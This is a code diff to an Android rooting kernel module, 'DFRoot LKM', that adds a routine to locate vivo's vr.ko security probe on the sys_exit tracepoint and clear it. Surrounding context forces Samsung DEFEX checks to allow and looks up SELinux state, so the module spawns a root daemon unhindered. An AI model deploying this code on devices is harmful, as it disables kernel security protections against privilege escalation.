@@ -5,6 +5,9 @@
 #include <linux/module.h>
 #include <linux/moduleparam.h>
 #include <linux/ptrace.h>
+#include <linux/rcupdate.h>
+#include <linux/string.h>
+#include <linux/tracepoint.h>
 
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("DFRoot LKM");
@@ -28,6 +31,52 @@ static int defex_pre_handler(struct kprobe *p, struct pt_regs *regs)
     regs->regs[0] = 0;         /* x0 = DEFEX_ALLOW */
     regs->pc = regs->regs[30]; /* skip body: return to caller */
     return 1;
+}
+
+/* vivo's vr.ko installs a sys_exit tracepoint probe that kills any euid-0
+ * process carrying its app-origin tag, which includes the ksud this module
+ * spawns. Zeroing the tracepoint head's funcs list stops the probe firing for
+ * every process; the iterator skips a NULL funcs and the commit_creds probe
+ * still runs. Resolved by symbol, so unlike ghostlock's per-KMI
+ * off_vr_sys_exit_tp this needs no hand-carried offset.
+ *
+ * Only touch funcs when vr.ko actually owns a probe in the list. On a kernel
+ * with no vr.ko the tracepoint is either empty or a legitimate user's (perf,
+ * ftrace, BPF), and clearing it would break them. The probe struct has no
+ * owning-module field on these KMIs (it only landed upstream in 6.10), so this
+ * maps each probe's function back to its module with __module_address(). */
+static void neutralize_vr(kallsyms_lookup_name_t get_addr)
+{
+    struct tracepoint *tp =
+        (struct tracepoint *)get_addr("__tracepoint_sys_exit");
+    struct module *(*module_at)(unsigned long) =
+        (struct module *(*)(unsigned long))get_addr("__module_address");
+    struct tracepoint_func *funcs, *f;
+
+    if (!tp) {
+        pr_info("dfroot: __tracepoint_sys_exit not found; vr.ko untouched\n");
+        return;
+    }
+    funcs = rcu_dereference_protected(tp->funcs, 1);
+    if (!funcs) {
+        pr_info("dfroot: sys_exit tracepoint empty; vr.ko not present\n");
+        return;
+    }
+    if (!module_at) {
+        pr_info("dfroot: __module_address unavailable; sys_exit left alone\n");
+        return;
+    }
+    for (f = funcs; f->func; f++) {
+        struct module *owner = module_at((unsigned long)f->func);
+        /* same match ghostlock uses: the "vr" module, or a "vr_*" sibling */
+        if (!owner) continue;
+        if (strncmp(owner->name, "vr", 2) != 0) continue;
+        if (owner->name[2] != '\0' && owner->name[2] != '_') continue;
+        WRITE_ONCE(tp->funcs, NULL);
+        pr_info("dfroot: vr.ko sys_exit probe neutralized (tp=%px)\n", tp);
+        return;
+    }
+    pr_info("dfroot: sys_exit tracepoint has no vr.ko probe; left alone\n");
 }
 
 static int __nocfi __init dirtyfrag_init(void)
@@ -77,6 +126,9 @@ static int __nocfi __init dirtyfrag_init(void)
     }
     get_addr = (kallsyms_lookup_name_t)kln_kp.addr;
     unregister_kprobe(&kln_kp);
+
+    /* before the usermodehelper below spawns ksud as uid 0 */
+    neutralize_vr(get_addr);
 
     selinux_state = (bool *)get_addr("selinux_state");
     if (!selinux_state) {
